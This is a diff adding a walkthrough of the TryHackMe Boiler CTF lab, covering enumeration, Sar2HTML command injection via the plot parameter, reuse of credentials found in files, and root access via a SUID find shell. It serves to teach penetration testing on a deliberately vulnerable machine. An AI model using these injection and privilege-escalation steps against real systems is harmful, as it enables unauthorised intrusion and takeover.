@@ -1,0 +1,253 @@
+# TryHackMe: Boiler CTF
+
+A concise walkthrough of the TryHackMe **Boiler CTF** machine, focusing on the key vulnerabilities, why they work, and the attack path.
+
+## Overview
+
+**Difficulty:** Intermediate
+**Platform:** Linux
+**Main vulnerabilities:**
+
+* FTP anonymous access
+* Hidden web directories
+* Sar2HTML command injection
+* Credential disclosure
+* Weak file permissions
+* SUID misconfiguration
+
+**Attack Chain:**
+
+```text
+Enumeration
+    ↓
+Hidden Joomla / Sar2HTML
+    ↓
+Command Injection
+    ↓
+Credentials for basterd
+    ↓
+SSH Access
+    ↓
+Password in backup.sh
+    ↓
+stoner
+    ↓
+SUID find
+    ↓
+Root
+```
+
+---
+
+## 1. Reconnaissance
+
+Start with:
+
+```bash
+nmap -sC -sV -p- <TARGET_IP>
+```
+
+Important services include:
+
+```text
+21      FTP
+80      HTTP
+10000   Webmin
+<PORT>  SSH
+```
+
+### FTP
+
+Anonymous FTP access is enabled:
+
+```bash
+ftp <TARGET_IP>
+```
+
+A hidden `.info.txt` file can be found. Its contents use **ROT13**, but the decoded message is mainly a distraction.
+
+### Web
+
+Check:
+
+```text
+http://<TARGET_IP>/robots.txt
+```
+
+There are several interesting-looking entries, but many are intentional rabbit holes.
+
+The important lesson is:
+
+> Enumerate everything, but verify findings before spending too much time on them.
+
+---
+
+## 2. Discover the Web Application
+
+Perform directory enumeration:
+
+```bash
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+```
+
+The scan eventually reveals a **Joomla** installation and, deeper inside it, **Sar2HTML**.
+
+Sar2HTML is an old and vulnerable monitoring application.
+
+---
+
+## 3. Sar2HTML Command Injection
+
+The vulnerable parameter is:
+
+```text
+/ index.php?plot=
+```
+
+A command can be injected using:
+
+```text
+;command
+```
+
+For example:
+
+```text
+/index.php?plot=;id
+```
+
+### Why does it work?
+
+The application passes user-controlled input to a system command without properly sanitizing it.
+
+The semicolon terminates the original command and allows us to append another OS command:
+
+```text
+Original command ; our command
+```
+
+This gives remote command execution.
+
+---
+
+## 4. Obtain SSH Credentials
+
+Use the command injection to read the application's `log.txt`:
+
+```bash
+cat log.txt
+```
+
+The file contains credentials for:
+
+```text
+User: basterd
+```
+
+Use the discovered SSH port:
+
+```bash
+ssh basterd@<TARGET_IP> -p <SSH_PORT>
+```
+
+We now have our first low-privileged shell.
+
+---
+
+## 5. Pivot to Stoner
+
+Enumerate the user's files:
+
+```bash
+ls -la
+```
+
+A `backup.sh` script is readable by the user.
+
+Inspect it:
+
+```bash
+cat backup.sh
+```
+
+The script contains a plaintext password for another local account:
+
+```text
+stoner
+```
+
+Switch users:
+
+```bash
+su stoner
+```
+
+Enter the password found in `backup.sh`.
+
+The `user.txt` flag can then be found in Stoner's home directory, including the hidden `.secret` file.
+
+---
+
+## 6. SUID Privilege Escalation
+
+Search for SUID binaries:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+A critical result is:
+
+```text
+/usr/bin/find
+```
+
+### Why is this dangerous?
+
+SUID means the program runs with the permissions of its file owner.
+
+If `find` is owned by root and has the SUID bit, commands executed through its `-exec` option can run with root privileges.
+
+Spawn a privileged shell:
+
+```bash
+find . -exec /bin/bash -p \; -quit
+```
+
+Verify:
+
+```bash
+id
+```
+
+You should now have:
+
+```text
+uid=0(root)
+```
+
+The final `root.txt` flag is now accessible.
+
+---
+
+## Key Takeaways
+
+### 1. Enumerate Thoroughly
+
+Services, directories, files, scripts, and unusual ports can all contain useful information.
+
+### 2. Do Not Chase Every Rabbit Hole
+
+Boiler CTF intentionally contains misleading information. Confirm whether a discovery actually leads somewhere before investing significant time.
+
+### 3. Command Injection
+
+Unsanitized input reaching system commands can turn a simple web application into remote code execution.
+
+### 4. Protect Credentials
+
+Passwords should never be stored in plaintext inside readable scripts.
+
+### 5. Review SUID Permissions
+
+SUID should not be assigned to powerful binaries such as `find` unless there is a very specific and controlled reason.
